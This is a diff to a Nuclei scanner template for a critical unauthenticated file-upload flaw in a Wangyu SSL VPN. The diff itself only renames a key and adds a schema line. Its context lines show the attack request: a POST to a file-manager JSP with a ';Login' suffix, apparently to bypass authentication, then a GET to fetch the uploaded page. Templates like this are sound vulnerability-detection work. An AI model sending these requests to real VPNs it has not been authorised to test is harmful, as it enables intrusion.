@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wangyu-ssl-vpn
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: critical
   tags: VPN,upload
 
-requests:
+http:
   - raw:
       - |
         POST /SSL/admin/so/FileManager.jsp;Login HTTP/1.1
@@ -22,7 +23,7 @@ requests:
 
       - |
         GET /SSL/ali.jsp HTTP/1.1
-        Host: {{Hostname}} 
+        Host: {{Hostname}}
     matchers-condition: and
     matchers:
       - type: status
